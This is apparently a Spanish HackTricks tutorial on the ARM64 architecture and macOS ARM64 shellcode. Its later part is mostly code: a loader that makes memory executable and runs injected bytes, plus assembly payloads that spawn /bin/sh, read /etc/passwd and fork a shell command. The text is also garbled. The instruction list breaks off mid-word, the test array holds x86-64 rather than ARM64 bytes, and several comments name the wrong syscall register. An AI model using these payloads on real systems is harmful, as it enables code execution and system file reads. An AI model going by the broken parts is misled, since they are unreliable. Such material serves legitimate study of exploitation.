# Introducción a ARM64

ARM64, también conocido como ARMv8-A, es una arquitectura de procesador de 64 bits utilizada en varios tipos de dispositivos, incluyendo teléfonos inteligentes, tabletas, servidores e incluso algunas computadoras personales de alta gama (macOS). Es un producto de ARM Holdings, una empresa conocida por sus diseños de procesadores eficientes en energía.

### Registros

ARM64 tiene **31 registros de propósito general**, etiquetados como `x0` a `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que requieren solo valores de 32 bits, los mismos registros se pueden acceder en un modo de 32 bits utilizando los nombres w0 a w30.

1. **`x0`** a **`x7`** - Estos se utilizan típicamente como registros de scratch y para pasar parámetros a subrutinas.
   * **`x0`** también lleva los datos de retorno de una función.
2. **`x8`** - En el kernel de Linux, `x8` se utiliza como el número de llamada al sistema para la instrucción `svc`. **¡En macOS se utiliza x16!**
3. **`x9`** a **`x15`** - Registros temporales, a menudo utilizados para variables locales.
4. **`x16`** y **`x17`** - Registros temporales, también utilizados para llamadas de función indirectas y stubs de PLT (Tabla de Enlace de Procedimiento).
   * **`x16`** se utiliza como el número de llamada al sistema para la instrucción **`svc`**.
5. **`x18`** - Registro de plataforma. En algunas plataformas, este registro está reservado para usos específicos de la plataforma.
6. **`x19`** a **`x28`** - Estos son registros guardados por el llamado. Una función debe preservar los valores de estos registros para su llamador.
7. **`x29`** - Puntero de marco.
8. **`x30`** - Registro de enlace. Contiene la dirección de retorno cuando se ejecuta una instrucción `BL` (Rama con Enlace) o `BLR` (Rama con Enlace a Registro).
9. **`sp`** - Puntero de pila, utilizado para realizar un seguimiento de la parte superior de la pila.
10. **`pc`** - Contador de programa, que apunta a la siguiente instrucción a ejecutar.

### Convención de llamada

La convención de llamada ARM64 especifica que los **primeros ocho parámetros** de una función se pasan en los registros **`x0` a `x7`**. Los parámetros **adicionales** se pasan en la **pila**. El valor de **retorno** se pasa de vuelta en el registro **`x0`**, o en **`x1`** también **si es de 128 bits**. Los registros **`x19`** a **`x30`** y **`sp`** deben ser **preservados** en las llamadas a funciones.

Al leer una función en ensamblador, busque el **prólogo y epílogo de la función**. El **prólogo** generalmente implica **guardar el puntero de marco (`x29`)**, **configurar** un **nuevo puntero de marco**, y **asignar espacio en la pila**. El **epílogo** generalmente implica **restaurar el puntero de marco guardado** y **regresar** de la función.

### Instrucciones comunes

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** que se realizará (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **fuente**. Los valores inmediatos también se pueden usar en lugar de los registros fuente.

* **`mov`**: **Mover** un valor de un **registro** a otro.
  * Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
* **`ldr`**: **Cargar** un valor de la **memoria** en un **registro**.
  * Ejemplo: `ldr x0, [x1]` — Esto carga un valor de la ubicación de memoria apuntada por `x1` en `x0`.
* **`str`**: **Almacenar** un valor de un **registro** en la **memoria**.
  * Ejemplo: `str x0, [x1]` — Esto almacena el valor en `x0` en la ubicación de memoria apuntada por `x1`.
* **`ldp`**: **Cargar par de registros**. Esta instrucción **carga dos registros** de **ubicaciones de memoria consecut
## macOS

### syscalls

Revisa [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).

### Shellcodes

Para compilar: 

{% code overflow="wrap" %}
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```
<detalles>

<resumen>Código C para probar el shellcode</resumen>

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x83\xc0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x31\xf6\x48\x83\xc6\x02\x48\x31\xd2\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";

int main(){
    printf("Shellcode length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
``` 

</detalles>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) y explicado.

{% tabs %}
{% tab title="con adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="con pila" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.
    
    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.
    
    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.
    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es una matriz de parámetros (que en memoria significa una pila de direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
    
    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59            ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar un comando con sh desde un fork para que el proceso principal no sea detenido
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
    
    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
